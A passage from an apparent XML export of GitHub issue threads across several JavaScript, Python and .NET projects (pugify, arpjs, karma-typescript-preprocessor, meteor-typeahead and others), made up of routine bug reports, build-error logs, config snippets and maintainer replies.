      <Body>Nope, the problem remains. From the CLI, I can make it say that the error is on the very first line of the template file, pretty much as soon as it sees anything not javascript.</Body>
    </Comment>
    <Comment>
      <Owner>bajax</Owner>
      <Body>The weirdest thing...  I can make my JS files build by blanking out the content of the .pug file, trying to load it (it'll succeed because there are no unexpected tokens in an empty file) and then, when I try to generate my JS again after restoring the pug file's contents, it works.  There is no reason for this.  I'm using npm5, I've deleted and reinstalled my node_modules a few times, and I'm running nodejs 8.0.1.&#13;
&#13;
Thanks.</Body>
    </Comment>
    <Comment>
      <Owner>gwezerek</Owner>
      <Body>I am also getting this error, though @bajax's fix isn't working.</Body>
    </Comment>
    <Comment>
      <Owner>bajax</Owner>
      <Body>@gwezerek The reason mine wasn't working was because I was requiring the pug templates through a symlink in node_modules.  Browserify transforms don't run on any file whose path is inside node_modules.  I just had to go back to referencing everything with relative paths.</Body>
    </Comment>
    <Comment>
      <Owner>gwezerek</Owner>
      <Body>Yes, thank you for updating and reminding me to! Indeed, I had the same problem. My solution was to add pugify (as a peer and dev dependency) and the pugify browserify transform to the package.json of the _linked_ module.</Body>
    </Comment>
  </Issue_562>
  <Issue_563>
    <Repository>pugify</Repository>
    <Title>Pug "name" client option breaks pugify</Title>
    <Owner>sidorares</Owner>
    <Body>When switching to pugify, I kept getting "template is not defined" errors. After much debugging, I figured out that I had specified a value for the "name" param documented in the pug client options (https://pugjs.org/api/reference.html) and pugify was not prepared for this. </Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>hi @gryphonmyers - could you provide simple self contained example for me to try?
</Body>
    </Comment>
    <Comment>
      <Owner>gryphonmyers</Owner>
      <Body>You should be able to just pass in name option to any working instance of your plugin like this and see it break:

```
b.transform(pugify.pug({
    name : "aTemplateNameThatIsNotTheWordTemplate",
pretty: false,
    compileDebug: false
});
```

If you're having trouble reproducing I can try writing a self-contained example for you
</Body>
    </Comment>
  </Issue_563>
  <Issue_564>
    <Repository>pugify</Repository>
    <Title>Rewritten core, bugfixes and ES2015</Title>
    <Owner>sidorares</Owner>
    <Body>Started as basic upgrade to ES2015, but turned into a full re-write as @tellnes suggested in #17. Builds on my previous PR in order to completely replace Jade with Pug. Due to breaking changes, recommend a `2.0.0` major release.
### Changes
- Re-wrote source to remove all Jade dependencies and references in favour of Pug
- Written source in ES2015, transpiled to ES5 with Babel. Only using ES2015 features that are natively supported in the latest Node.js version (`5.x`)
- Dropped support for Jade `&lt; 1.0` (added 3 years ago). Reasoning being, Pugify `2.x` depends on Pug, which is equivalent to the latest Jade version. Backwards compatibility can be achieved by using Pugify `1.x`.
- Fixed #16 - Seems that [jade-code-gen](https://github.com/pugjs/jade-code-gen) changed syntax, breaking the regex. Unsure if this is the real cause, but my implementation passes tests.
- Dropped peerDependencies
- Updated README.md replacing all Jade references with Pug, and examples of updated usage.
- Added better error handling.

Sorry for the hefty PR. I appreciate your thoughts on this. I'll be sticking around to pick up any issues, especially as the Jade -&gt; Pug transition completes.

As this is now the main `pugify` on npm, I think we have a moral imperative to keep the codebase clean, up-to-date and bug-free.
</Body>
    <State>open</State>
    <Comment>
      <Owner>tellnes</Owner>
      <Body>Added a few comments. Nothing major.

The `transformTools.makeStringTransform` suggestion can maybe be done in another pr after this one is merged.

This pr also remove the `reqguire.extensions` registration feature. I'm +1 on doing that, but it should be mentioned.
</Body>
    </Comment>
    <Comment>
      <Owner>herzinger</Owner>
      <Body>Sorry to butt in, but is this project active at all? I was meaning to use it, but such a major PR stopped since February 2016 kinda dissuaded me. I'm making a major rewrite of a big project, and was thinking of changing from jade to pug in it, and so going from jadeify to pugify, but this situation smells like trouble like this.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@herzinger it's not very active but I'm keen to maintain it&#13;
&#13;
Do you want to hellp with this pr? To start we need to pull https://github.com/izolate/pugify.git#esnext and rebase it</Body>
    </Comment>
  </Issue_564>
  <Issue_565>
    <Repository>react-x11</Repository>
    <Title>reuse code from mylittledom</Title>
    <Owner>sidorares</Owner>
    <Body>style implementation might be possible to completely reuse - https://github.com/manaflair/mylittledom/tree/master/sources/core/style&#13;
&#13;
maybe some other parts&#13;
&#13;
tagging @arcanis in hope to get some attention :)</Body>
    <State>open</State>
    <Comment>
      <Owner>arcanis</Owner>
      <Body>I think most of what's in the `core` folder could be reused, since they aren't really tied to the terminal part of mylittledom - the only thing that comes into my mind is the [forwardToTextLayout](https://github.com/manaflair/mylittledom/blob/master/sources/core/style/styleTriggers.js#L78-L91) trigger, which probably doesn't make as much sense with x11 (or maybe it does?).&#13;
&#13;
The main thing I'm a bit concerned about is that I still plan some refactoring of this code (especially the styles), since I think I made the code a bit more complex than it should be (I tried to replicate classes, and by doing so I made some questionable choices that probably hinder the perfs).</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks for having a look @arcanis &#13;
&#13;
&gt;  which probably doesn't make as much sense with x11 (or maybe it does?).&#13;
&#13;
There is currently no text layout built in at all ( just canvas-like api [fillText/measureText](https://github.com/sidorares/ntk/blob/e57066fe4679a6457e4cea39b3170299d6ce6a18/lib/renderingcontext_2d.js#L139-L174) ) but I hope to add some kind of text layout manager using freebidi / harfbuzz , maybe also use yoga-layout with words as flex-wrap items&#13;
&#13;
&gt; The main thing I'm a bit concerned about is that I still plan some refactoring of this code (especially the styles), since I think I made the code a bit more complex than it should be (I tried to replicate classes, and by doing so I made some questionable choices that probably hinder the perfs).&#13;
&#13;
That's totally fine, I don't expect  start adding styles and "minidom" components very soon, so you just keep in mind there are other projects that might want to factor out some of your functionality some time later</Body>
    </Comment>
  </Issue_565>
  <Issue_566>
    <Repository>Doga</Repository>
    <Title>Abort installation if version is Python 3</Title>
    <Owner>pravj</Owner>
    <Body>This PR stops the installation process from proceeding if the version is Python 3 (which is not currently supported) as discussed in #4.

``` bash
$ python setup.py install
Sorry, Doga does not support Python 3 at this stage
```

In addition to the above, I've added 'classifiers' (note that Python 3 is omitted there). Fee free to expand the list if you'd like it to support versions prior to 2.7.
</Body>
    <State>open</State>
    <Comment>
      <Owner>pravj</Owner>
      <Body>Hi @microamp,
So sorry for replying very late, actually I was busy with my exams and things.

Yeah, this PR is right way to divert `Python3` users but can you please make sure that this will not limit the users to `Python2.7`?

If we merge this without checking this out for older Python versions, this will be a wrong thing, I think.
</Body>
    </Comment>
    <Comment>
      <Owner>microamp</Owner>
      <Body>Hi @pravj, 

My apologies on my late reply.

What Python 2 versions are you targetting apart from Python 2.7? So far, I've only tested it with 2.7 personally. I guess having a test suite would make things easier (CI (e.g. Travis) with the versions to support specified) although I'm not sure how trivial to write them for this particular application. Are you planning to write one in the near future?
</Body>
    </Comment>
  </Issue_566>
  <Issue_567>
    <Repository>Doga</Repository>
    <Title>Process hangs when quit</Title>
    <Owner>pravj</Owner>
    <Body>Managed to run Doga using Python 2, but the process seems to hang when I quit it.

When I tried to kill the process manually after waiting for a few minutes, I got the following error. (The process was still running after the keyboard interruption, so I manually shut down the terminal it was running on.)

``` bash
^CTraceback (most recent call last):
  File "/usr/bin/doga", line 9, in &lt;module&gt;
    load_entry_point('Doga==0.2.0', 'console_scripts', 'doga')()
  File "/usr/lib/python2.7/site-packages/Doga/doga.py", line 57, in main
    socket_interface = SocketInterface(packet_parser)
  File "/usr/lib/python2.7/site-packages/Doga/interfaces/sockets.py", line 25, in __init__
    self.capture(self.raw_socket)
  File "/usr/lib/python2.7/site-packages/Doga/interfaces/sockets.py", line 65, in capture
    packet_tuple = sock.recvfrom(65565)
KeyboardInterrupt
^C^C
```

By the way, it looks good. Looking forward to seeing further enhancements in the future.
</Body>
    <State>open</State>
    <Comment>
      <Owner>pravj</Owner>
      <Body>yeah I have created an issue #1 for this thing.
I'll first work for issue #2 this evening and will come to this soon.
</Body>
    </Comment>
    <Comment>
      <Owner>pravj</Owner>
      <Body>as of now I use `Ctrl + Z` to exit of application. and then `pkill` :smile: 
</Body>
    </Comment>
  </Issue_567>
  <Issue_568>
    <Repository>Harry</Repository>
    <Title>Add support for traditional smileys symbols</Title>
    <Owner>pravj</Owner>
    <Body>Like :p -&gt; :stuck_out_tongue: 
</Body>
    <State>open</State>
    <Comment>
      <Owner>pravj</Owner>
      <Body>cool, just noticed that they are not in `emoji-cheat-sheet`
will work on it :stuck_out_tongue:, pkka
</Body>
    </Comment>
  </Issue_568>
  <Issue_569>
    <Repository>interns-exer2</Repository>
    <Title>proposed changes to solve #1</Title>
    <Owner>electricjesus</Owner>
    <Body>I just add a condition "if(index)". All data in index[0] will be ignored.
</Body>
    <State>open</State>
    <Comment>
      <Owner>electricjesus</Owner>
      <Body>Close, but you need to be explicit: `if(index !== 0)` for safety.

You also need to re-configure your git to commit using UNIX-style line endings
</Body>
    </Comment>
  </Issue_569>
  <Issue_570>
    <Repository>meteor-lunr</Repository>
    <Title>Meteor has no method lunr (server)</Title>
    <Owner>electricjesus</Owner>
    <Body>Running meteor 0.6.5 with the following code results in method error.

``` js
Meteor.startup(function(e) {

    Posts.index = Meteor.lunr(function() {
        this.field('title', {boost: 10});
        this.field('description');
        this.ref('_id');
    });

    Posts.find({},{fields : {title: 1, description: 1}}).forEach(function(v){ Posts.index.add(v); });

});
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>electricjesus</Owner>
      <Body>That's weird. Are you using master? Checking this out for you.
</Body>
    </Comment>
    <Comment>
      <Owner>electricjesus</Owner>
      <Body>A certain way of making sure this would not happen is when you inspect `packages/lunr/server.js`, you would see the following around line 15:

``` javascript
api.add_files([
    'server.js'
  ], 'server');
```
</Body>
    </Comment>
    <Comment>
      <Owner>Sivli-Embir</Owner>
      <Body>Yep as per your preferred method:

``` js
"meteor-lunr" : { 
        "branch" : "master",
        "git" : "https://github.com/electricjesus/meteor-lunr.git"
      }
```

I also have the server side files starting on line 15. Is this possibly an api.export issue? I still am figuring out the new package export format but I did see you were not exporting anything.
</Body>
    </Comment>
    <Comment>
      <Owner>domarty</Owner>
      <Body>Did this ever get sorted out?  I'm running into the same issue.
</Body>
    </Comment>
  </Issue_570>
  <Issue_571>
    <Repository>arpjs</Repository>
    <Title>Can't install</Title>
    <Owner>skepticfx</Owner>
    <Body>```&#13;
$ npm install arpjs -g&#13;
&#13;
&gt; typechecker@2.0.8 preinstall C:\Users\inf3rno\AppData\Roaming\npm\node_modules\arpjs\node_modules\typechecker&#13;
&gt; node ./cyclic.js&#13;
&#13;
&#13;
&#13;
&gt; pcap@2.0.0 install C:\Users\inf3rno\AppData\Roaming\npm\node_modules\arpjs\node_modules\pcap&#13;
&gt; node-gyp rebuild&#13;
&#13;
&#13;
C:\Users\inf3rno\AppData\Roaming\npm\node_modules\arpjs\node_modules\pcap&gt;if not defined npm_config_node_gyp (node "C:\Program Files\nodejs\node_modules\npm\bin\node-gyp-bin\\..\..\node_modules\node-gyp\bin\node-gyp.js" rebuild )  else (node "" rebuild )&#13;
Building the projects in this solution one at a time. To enable parallel build, please add the "/m" switch.&#13;
  pcap_binding.cc&#13;
  pcap_session.cc&#13;
  win_delay_load_hook.cc&#13;
..\pcap_binding.cc(2): fatal error C1083: Cannot open include file: 'pcap/pcap.h': No such file or directory [C:\Users\inf3rno\AppData\Roaming\npm\node_modules\arpjs\node_modules\pcap\build\pcap_binding.vcxproj]&#13;
..\pcap_session.cc(2): fatal error C1083: Cannot open include file: 'pcap/pcap.h': No such file or directory [C:\Users\inf3rno\AppData\Roaming\npm\node_modules\arpjs\node_modules\pcap\build\pcap_binding.vcxproj]&#13;
gyp ERR! build error&#13;
gyp ERR! stack Error: `C:\Program Files (x86)\MSBuild\14.0\bin\msbuild.exe` failed with exit code: 1&#13;
gyp ERR! stack     at ChildProcess.onExit (C:\Program Files\nodejs\node_modules\npm\node_modules\node-gyp\lib\build.js:258:23)&#13;
gyp ERR! stack     at emitTwo (events.js:125:13)&#13;
gyp ERR! stack     at ChildProcess.emit (events.js:213:7)&#13;
gyp ERR! stack     at Process.ChildProcess._handle.onexit (internal/child_process.js:197:12)&#13;
gyp ERR! System Windows_NT 6.1.7601&#13;
gyp ERR! command "C:\\Program Files\\nodejs\\node.exe" "C:\\Program Files\\nodejs\\node_modules\\npm\\node_modules\\node-gyp\\bin\\node-gyp.js" "rebuild"&#13;
gyp ERR! cwd C:\Users\inf3rno\AppData\Roaming\npm\node_modules\arpjs\node_modules\pcap&#13;
gyp ERR! node -v v8.1.2&#13;
gyp ERR! node-gyp -v v3.6.2&#13;
gyp ERR! not ok&#13;
npm ERR! code ELIFECYCLE&#13;
npm ERR! errno 1&#13;
npm ERR! pcap@2.0.0 install: `node-gyp rebuild`&#13;
npm ERR! Exit status 1&#13;
npm ERR!&#13;
npm ERR! Failed at the pcap@2.0.0 install script.&#13;
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.&#13;
&#13;
npm ERR! A complete log of this run can be found in:&#13;
npm ERR!     C:\Users\inf3rno\AppData\Roaming\npm-cache\_logs\2017-06-20T16_02_40_905Z-debug.log&#13;
&#13;
&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>inf3rno</Owner>
      <Body>Ohh I see this is a pcap error.</Body>
    </Comment>
    <Comment>
      <Owner>inf3rno</Owner>
      <Body>The pcap does not seem to be maintained any longer. https://github.com/node-pcap/node_pcap&#13;
Any idea how to fix this? Can't you use another dependency instead, this appears to be a complete mess, and it does not work on new node versions. Is there any alternative way (with nodejs) to capture ARP requests coming from the router?</Body>
    </Comment>
    <Comment>
      <Owner>roccomuso</Owner>
      <Body>Have you read our README first?&#13;
First of all `arpjs` has never been tested on Windows.&#13;
&#13;
I'm not sure the issue is strictly related to `node_pcap`.&#13;
Do you have libpcap for windows installed?&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>inf3rno</Owner>
      <Body>I installed node_gyp and this: https://www.winpcap.org/ . Is there a way to test somehow from CLI (git bash) whether this is really working the same way as the Linux version?&#13;
&#13;
note:&#13;
Many ppl use pcap on Windows according to the node_pcap issues, so in theory it works. e.g. https://github.com/node-pcap/node_pcap/issues/177</Body>
    </Comment>
  </Issue_571>
  <Issue_572>
    <Repository>arpjs</Repository>
    <Title>Handle long output from arp</Title>
    <Owner>skepticfx</Owner>
    <Body>If the output from arp is long for example (256 lines), the on 'data' for stdout is called multiple times and the complete arp table is not returned.

I have a fix for it this pull request https://github.com/skepticfx/arpjs/pull/5
</Body>
    <State>open</State>
    <Comment>
      <Owner>skepticfx</Owner>
      <Body>Thanks @rishabhtulsian 

I've merged it now. If you're interested I can add you as a moderator as well, so you can commit directly :) Let me know.
</Body>
    </Comment>
  </Issue_572>
  <Issue_573>
    <Repository>CronDaemon</Repository>
    <Title>Unhandled exception 'The value needs to translate in milliseconds to -1 (signifying an infinite timeout)'</Title>
    <Owner>sergeyt</Owner>
    <Body>cronexpression: expression="23 2 8 * *" &#13;
datetime.now: 11.01.2019 08:00&#13;
&#13;
&#13;
Parameter name: delay&lt;/Message&gt;&lt;StackTrace&gt;   at System.Threading.Tasks.Task.Delay(TimeSpan delay, CancellationToken cancellationToken)&#13;
   at CronScheduling.CronDaemon`1.&amp;amp;lt;&amp;amp;gt;c__DisplayClass2.&amp;amp;lt;&amp;amp;lt;Add&amp;amp;gt;b__1&amp;amp;gt;d__4.MoveNext()&#13;
--- End of stack trace from previous location where exception was thrown ---&#13;
   at System.Runtime.CompilerServices.AsyncMethodBuilderCore.&amp;amp;lt;&amp;amp;gt;c.&amp;amp;lt;ThrowAsync&amp;amp;gt;b__6_1(Object state)&#13;
   at System.Threading.QueueUserWorkItemCallback.WaitCallback_Context(Object state)&#13;
   at System.Threading.ExecutionContext.RunInternal(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean preserveSyncCtx)&#13;
   at System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean preserveSyncCtx)&#13;
   at System.Threading.QueueUserWorkItemCallback.System.Threading.IThreadPoolWorkItem.ExecuteWorkItem()&#13;
   at System.Threading.ThreadPoolWorkQueue.Dispatch()&#13;
   at System.Threading._ThreadPoolWaitCallback.PerformWaitCallback()&lt;/StackTrace&gt;&lt;ExceptionString&gt;System.ArgumentOutOfRangeException: The value needs to translate in milliseconds to -1 (signifying an infinite timeout), 0 or a positive integer less than or equal to Int32.MaxValue.&#13;
Parameter name: delay&#13;
   at System.Threading.Tasks.Task.Delay(TimeSpan delay, CancellationToken cancellationToken)&#13;
   at CronScheduling.CronDaemon`1.&amp;amp;lt;&amp;amp;gt;c__DisplayClass2.&amp;amp;lt;&amp;amp;lt;Add&amp;amp;gt;b__1&amp;amp;gt;d__4.MoveNext()&#13;
--- End of stack trace from previous location where exception was thrown ---&#13;
   at System.Runtime.CompilerServices.AsyncMethodBuilderCore.&amp;amp;lt;&amp;amp;gt;c.&amp;amp;lt;ThrowAsync&amp;amp;gt;b__6_1(Object state)&#13;
   at System.Threading.QueueUserWorkItemCallback.WaitCallback_Context(Object state)&#13;
   at System.Threading.ExecutionContext.RunInternal(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean preserveSyncCtx)&#13;
   at System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean preserveSyncCtx)&#13;
   at System.Threading.QueueUserWorkItemCallback.System.Threading.IThreadPoolWorkItem.ExecuteWorkItem()&#13;
   at System.Threading.ThreadPoolWorkQueue.Dispatch()&#13;
   at System.Threading._ThreadPoolWaitCallback.PerformWaitCallback()&lt;/ExceptionString&gt;&lt;/Exception&gt;&lt;/TraceRecord&gt;&#13;
An unhandled exception of type 'System.ArgumentOutOfRangeException' occurred in mscorlib.dll&#13;
The value needs to translate in milliseconds to -1 (signifying an infinite timeout), 0 or a positive integer less than or equal to Int32.MaxValue.</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@darkpersoft please feel free to make PR with the fix :)</Body>
    </Comment>
  </Issue_573>
  <Issue_574>
    <Repository>fogbugz.js</Repository>
    <Title>Adding basic attachment functionality</Title>
    <Owner>sergeyt</Owner>
    <Body>I couldn't get it to print well with cleaner property names, for what ever reason when i attempted to map the return array it kept crashing the events section. Any idea what i could do to fix this? &#13;
&#13;
Anyways, still works fine without the cleaner output.</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@jdalrymple look at [getarr](https://github.com/jdalrymple/fogbugz.js/blob/3d5b406a0e3a65783d575eef396437c8edd91460/fogbugz.js#L149) function and try to use it.</Body>
    </Comment>
    <Comment>
      <Owner>jdalrymple</Owner>
      <Body>So i tested with the getarr function and it is cleaner BUT i need a way of getting the fogbugz domain the user passed in as an option, since the url is only a suffix to that domain. Any ideas?&#13;
</Body>
    </Comment>
  </Issue_574>
  <Issue_575>
    <Repository>kanban</Repository>
    <Title>Documentation : How to run and deploy?</Title>
    <Owner>sergeyt</Owner>
    <Body>Do you have any hints how to run this Meteor app?

If I start `./app/start-app.sh` it only complains about `no package named cfs:reactive-property`.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@almereyda just yesterday I've started migration to METEOR@0.9, so everything is broken now. If you still intrested you could update to d829d0e8c77a2f1d1dcc20e5f5f553bea88cbd3e revision and try `./app/start-app.sh` again. Also I have plans to add github integration soon.
</Body>
    </Comment>
  </Issue_575>
  <Issue_576>
    <Repository>karma-resharper</Repository>
    <Title>Is this plugin working?</Title>
    <Owner>sergeyt</Owner>
    <Body>Hi,
       is this plugin working? How can I use it? I did not find it on nuget resharper library.  I will really love to use it of it is working. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@elranu it is feasible to make it working at least for R# v7. Last time I could run selected tests right from visual studio, but the test results updated after session (karma process) completed.
</Body>
    </Comment>
  </Issue_576>
  <Issue_577>
    <Repository>karma-typescript-preprocessor</Repository>
    <Title>Can not load "typescript", it is not registered!</Title>
    <Owner>sergeyt</Owner>
    <Body>The instruction in the readme only mentions to:&#13;
1. Install by running `npm install karma-typescript-preprocessor --save-dev`&#13;
2. Update the preprocessors as follows: `preprocessors: { '**/*.ts': ['typescript']}`&#13;
3. Configure `typescriptPreprocessor`&#13;
&#13;
I did all these three but when I run the test I get an error saying:&#13;
&#13;
```&#13;
:ERROR [preprocess]: Can not load "typescript", it is not registered!&#13;
  Perhaps you are missing some plugin?&#13;
```&#13;
&#13;
Is there an instruction step that is missing?</Body>
    <State>open</State>
    <Comment>
      <Owner>dadepo</Owner>
      <Body>An instruction step was missing in the README. Added it here https://github.com/sergeyt/karma-typescript-preprocessor/pull/73</Body>
    </Comment>
  </Issue_577>
  <Issue_578>
    <Repository>karma-typescript-preprocessor</Repository>
    <Title>Sourcemaps not served</Title>
    <Owner>sergeyt</Owner>
    <Body>so when I include spec files and let them be handled by karma-typescript-preprocessor, I see that the files contain a reference to the sourcemaps at their bottom. Yet the problem is that the files itself are not served up in karma. I do get web-server warnings like `404: /base/path/to/spec.map`&#13;
&#13;
Where are the sourcemaps actually created? Could we setup proxy definitions to point karma to the right location?</Body>
    <State>open</State>
    <Comment>
      <Owner>tenkmilan</Owner>
      <Body>I face the same issue right now and I'm stuck with it.</Body>
    </Comment>
  </Issue_578>
  <Issue_579>
    <Repository>karma-typescript-preprocessor</Repository>
    <Title>Can't compile test: Possible issue with my setup?</Title>
    <Owner>sergeyt</Owner>
    <Body>I can't get a simple test to work. Can you let me know of any reason the following shouldn't work? The error I receive is `SyntaxError: Unexpected token 'const'` on line 3 of my compiled test. I am just running the test with `karma start` 

_...is there a way to leave the test so I can read it?_

`main.ts` file: 

```
export default class Main {
    constructor() {
        this.testFunction();
    }

    addOne (x) {
        x = x + 1;
        return x;
    }
}
```

`karma.conf.js` file:

```
// preprocess matching files before serving them to the browser
// available preprocessors: https://npmjs.org/browse/keyword/karma-preprocessor
preprocessors: {
  '**/*.ts': ['typescript']
},

// typescript preprocessor definition and config
typescriptPreprocessor: {
  //options passed to the typescript compiler
  options: {
    target: 'es5',
    module: 'system',
    noImplicitAny: true,
    sourceMap: false,
    emitDecoratorMetadata: true,
    experimentalDecorators: true,
    noResolve: true,
    concatenateOutput: false
  },
  // transforming the filenames
  transformPath: function(path) {
    return path.replace(/\.ts$/, '.js');
  }
},
```

`main-controller-spec.ts` file: 

```
/// &lt;reference path="../../../../typings/karma-jasmine/karma-jasmine.d.ts" /&gt;

import Main from '../../../../src/app/main/controllers/main';

describe('quick test of tests :D', () =&gt; {
    let main;

    beforeEach(() =&gt; {
        main = new Main();
    })

    it('should run the function from above', () =&gt; {
        var x = 2;
        spyOn(main, 'addOne');
        main.addOne(x);
        expect(main.addOne).toHaveBeenCalledWith(2);
    })
})
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidouglas</Owner>
      <Body>Great to see the community lent you a hand on this :(. Did you managed to get this resolved? Suffering from similar isssue...
</Body>
    </Comment>
  </Issue_579>
  <Issue_580>
    <Repository>karma-typescript-preprocessor</Repository>
    <Title>Uncaught SyntaxError: Unexpected token import</Title>
    <Owner>sergeyt</Owner>
    <Body>Here is my angular module,

app.ts:

```
 /// &lt;reference path='../thirdparty/jasmine/jasmine.d.ts'/&gt;
 /// &lt;reference path= '../thirdparty/angular/angular.d.ts'/&gt;
 import {common} from './modules/common/Common.module';
 var app:ng.Imodule= angular.module('comp', [common.name]);
```

app.test.ts:

```
    /// &lt;reference path='../thirdparty/jasmine/jasmine.d.ts'/&gt;
   /// &lt;reference path= '../thirdparty/angular/angular.d.ts'/&gt;

   import {comp} from './app';

   export function main() {
     describe('comp', function () {
    it('Comp should be defined', function () {
        expect(comp).toBeDefined();
    });
    });
   }
```

Karma.config.ts

```
   module.exports = function (config) {
    config.set({
    frameworks: ['jasmine'],
    basePath: '',
    preprocessors: {
        'app/app.ts': ['typescript'],
        'app/app.test.ts': ['typescript']
    },
    typescriptPreprocessor: {
        typings: [
            'thirdparty/jasmine/jasmine.d.ts',
            'node_modules/typescript/typescript.d.ts',
            'thirdparty/angular/angular.d.ts',
            'thirdparty/jquery/src/jquery.d.ts'
        ],
        options: {
            sourceMap: false,
            target: 'ES5',
            module: 'commonjs',
            noImplicitAny: true,
            noResolve: true,
            removeComments: true,
            concatinateOutput: false
        },
    },
    files: [
        'app/modules/**/*.module.ts',
        'app/app.ts',
        'app/app.test.ts',
        'node_modules/requirejs/require.js'
    ],
    exclude: [
        'modules/**/e2e_test/**',
        'app/**/e2e/**/*.js',
        'thirdparty/pioneer/featureFlag/**/*{t,T}est.js',
        'app/Templates.ts',
        'app/routes.ts',
        'app/ThirdpartyTemplates.ts'
    ],
    browsers: ['Chrome'],
    reporters: ['spec', 'junit'],
    specReporter: { maxLogLines: 5 },
    junitReporter: {
        outputFile: './build/work/jasmine/TEST-results.xml',
        suite: 'COMP'
    },
    port: 9876
});
 };
```

running the test throws error saying that unexpected token import  and cannot import app. Not sure whats is wrong. Did some one came across this issue? Can some point where is the mistake. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>pauleau</Owner>
      <Body>Same for me using Jasmine in AngularJS2 with NodeJS application.

$ jasmine
C:\xampp\htdocs\xxx\@xxx\ng2_msButton\spec\msButton.component.spec.js:2
import {
^^^^^^
SyntaxError: Unexpected token import
</Body>
    </Comment>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>the preprocessor is just rewritten using https://github.com/sergeyt/typescript-simple, so now it should support all compiler options. Please retry again.
</Body>
    </Comment>
    <Comment>
      <Owner>SayusiAndo</Owner>
      <Body>Still exist. How can I use typescript-simple? Do I have to change typescript to typescript-simple here?

```
preprocessors: {
        'app/app.ts': ['typescript'], //['typescript-simple']
        'app/app.test.ts': ['typescript']
    },
```
</Body>
    </Comment>
    <Comment>
      <Owner>endel</Owner>
      <Body>I gave up using `karma-typescript-preprocessor` in favor of webpack.

My `karma.config.js` looks like this:

``` javascript
    preprocessors: {
      "./test/**/**/**.test.ts": ["webpack"]
    },
```
</Body>
    </Comment>
    <Comment>
      <Owner>neuropaddy</Owner>
      <Body>could you share the karma.conf.js to me as reference, which dependencies are required?</Body>
    </Comment>
  </Issue_580>
  <Issue_581>
    <Repository>meteor-typeahead</Repository>
    <Title>Can't bind and operate on typeahead element</Title>
    <Owner>sergeyt</Owner>
    <Body>Initializing with Meteor.typeahead and assigning ID to input element, while operations like $(ele).typeahead("val", "example") work, trying to .focus() or .on() will not work using that same id.</Body>
    <State>open</State>
    <Comment>
      <Owner>janat08</Owner>
      <Body>@sergeyt reproduciton here: https://github.com/janat08/blockrazor/tree/typeaheadConversionToReactive&#13;
the component is in /ui/components/typeahead, and test implementation is in /ui/pages/compareCurrencies</Body>
    </Comment>
  </Issue_581>
  <Issue_582>
    <Repository>meteor-typeahead</Repository>
    <Title>Updating typeahead from maintained forks</Title>
    <Owner>sergeyt</Owner>
    <Body>The original typeahead is no longer maintained, but there's maintained one here: https://github.com/corejavascript/typeahead.js&#13;
Would it be possible to merge their udpates?</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@janat08 sure if someone makes a PR with this update, please feel free to be the first one :)</Body>
    </Comment>
    <Comment>
      <Owner>janat08</Owner>
      <Body>Lol, I just tried making a pull request from the maintained version, and it told me that they can't be compared, the idea then is to do this by hand?</Body>
    </Comment>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>yes you could just replace typeahead.bundle.js file, or consider to check getting dependency from npm. AFAIK meteor is capable to work with npm these days.</Body>
    </Comment>
    <Comment>
      <Owner>janat08</Owner>
      <Body>oh right.</Body>
    </Comment>
    <Comment>
      <Owner>janat08</Owner>
      <Body>Well I settled for just updating the bundle which lets me bind custom events which I think didn't happen previously. The sad thing that ele.focus() doesn't work still.</Body>
    </Comment>
  </Issue_582>
  <Issue_583>
    <Repository>meteor-typeahead</Repository>
    <Title>Typeahead always shows only 5 suggestions maximum</Title>
    <Owner>sergeyt</Owner>
    <Body>Hello, &#13;
Typeahead always shows only 5 suggestions maximum. How to change sufficient count.</Body>
    <State>open</State>
    <Comment>
      <Owner>tdotholla</Owner>
      <Body>check this page on the typeahead docs: &#13;
[Datasets](https://github.com/twitter/typeahead.js/blob/master/doc/jquery_typeahead.md#datasets)&#13;
&#13;
&gt; `limit` &#8211; The max number of suggestions to be displayed. Defaults to `5`.</Body>
    </Comment>
    <Comment>
      <Owner>alexvnz</Owner>
      <Body>Just adding data-limit="10" to input properties works for me</Body>
    </Comment>
  </Issue_583>
  <Issue_584>
    <Repository>meteor-typeahead</Repository>
    <Title>Custom Templates not working...</Title>
    <Owner>sergeyt</Owner>
    <Body>I have tried to implement a custom template but nothing shows up, it seems fairly straightforward. 

This is the code I'm using...

```
&lt;template name="companySearch"&gt;
    &lt;input class="form-control typeahead dispatch_entry" name="company" type="text"
           placeholder="Company Name"
           autocomplete="off" spellcheck="off"
           data-source="dispatchCompanies" data-template="companyDropdown"/&gt;
&lt;/template&gt;

&lt;template name="companyDropdown"&gt;
    &lt;p class="companyName"&gt;{{companyName}}&lt;/p&gt;
    &lt;p class="companyCity"&gt;{{address.city}}&lt;/p&gt;
    &lt;p class="companyProv"&gt;{{address.prov}}&lt;/p&gt;
    &lt;p class="companyCountry"&gt;{{address.country}}&lt;/p&gt;
&lt;/template&gt;
```

Any suggestions as to why nothing displays?
</Body>
    <State>open</State>
    <Comment>
      <Owner>michaeljfalk</Owner>
      <Body>I have found that this works for implementing a custom template...

Define your input like this in your templates file...

```
&lt;template name="companySearch"&gt;
    &lt;input id="company_entry" class="form-control typeahead dispatch_entry" name="name" type="text"
           placeholder="Company Name"
           autocomplete="off" spellcheck="false"
           data-sets="dispatchCompanies"/&gt;
&lt;/template&gt;
&lt;template name="companiesTemplate"&gt;
    &lt;div class="suggestionDiv"&gt;
